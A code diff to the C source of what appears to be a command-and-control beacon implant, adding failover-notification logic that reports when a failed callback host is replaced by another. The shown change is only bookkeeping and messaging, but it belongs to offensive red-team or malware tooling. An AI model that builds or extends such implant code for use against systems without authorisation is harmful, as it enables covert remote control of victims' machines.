@@ -34,7 +34,8 @@
  *     7 reset   z scope, z host          (host may be empty)
  *     9 failover_notification_set: int onoff (after the verb)
  *     0 info / 6 profiles / 8 failover_notification_get: no operands
- * Replies are CALLBACK_OUTPUT text.
+ * Replies are CALLBACK_OUTPUT text; the failover notification (opt-in) is
+ * CALLBACK_HOST_FAILOVER.
  * ------------------------------------------------------------------------- */
 #include <windows.h>
 #include <stdio.h>
@@ -62,6 +63,7 @@ static int      hc_n       = 0;
 static int      hc_cursor  = -1;
 static BOOL     hc_failov_notify = FALSE;
 static BOOL     hc_last_failed   = FALSE;
+static char     hc_failed_host[HC_HOST_LEN] = "";   /* the one hc_last_failed is about */
 static char     hc_last_host[HC_HOST_LEN] = "";
 
 /* comma-token walk over a caller-owned scratch copy */
@@ -122,6 +124,7 @@ void hostcfg_init(const char * domains) {
 	hc_n = 0;
 	hc_cursor = -1;
 	hc_last_failed = FALSE;
+	hc_failed_host[0] = '\0';
 	hc_last_host[0] = '\0';
 	if (domains == NULL)
 		return;
@@ -193,7 +196,14 @@ BOOL hostcfg_pick(char * host, int hmax, char * uri, int umax) {
 }
 
 /* per-cycle health report from the main loop; drives failover stats and
- * the failover_notification message (re-established after failure) */
+ * the failover notification.
+ *
+ * The notification is the operator's choice (beacon_config failover_notification
+ * true; off by default) and goes out when a connection is re-established
+ * after a failure, not at the move: a beacon that has not checked in yet has
+ * no session to send with. It rides CALLBACK_HOST_FAILOVER - the frame the
+ * client formats with BEACON_OUTPUT_HOST_FAILOVER - so the console adds its
+ * own [+]; the text carries none. */
 void hostcfg_note(const char * host, BOOL ok) {
 	int i;
 	extern void command_shell_callback(char * buffer, int length, int type);
@@ -207,11 +217,18 @@ void hostcfg_note(const char * host, BOOL ok) {
 			break;
 		}
 	}
+	if (!ok) {
+		strncpy(hc_failed_host, host, HC_HOST_LEN - 1);
+		hc_failed_host[HC_HOST_LEN - 1] = '\0';
+	}
 	if (hc_failov_notify && hc_last_failed && ok) {
 		char msg[320];
-		_snprintf(msg, sizeof(msg) - 1,
-			"[+] beacon_config: connection re-established via host %s\n", host);
-		command_shell_callback(msg, (int)strlen(msg), CALLBACK_OUTPUT);
+		if (hc_failed_host[0] != '\0')
+			_snprintf(msg, sizeof(msg) - 1, "callback host %s failed, connection re-established via host %s\n",
+				hc_failed_host, host);
+		else
+			_snprintf(msg, sizeof(msg) - 1, "connection re-established via host %s\n", host);
+		command_shell_callback(msg, (int)strlen(msg), CALLBACK_HOST_FAILOVER);
 	}
 	hc_last_failed = !ok;
 }
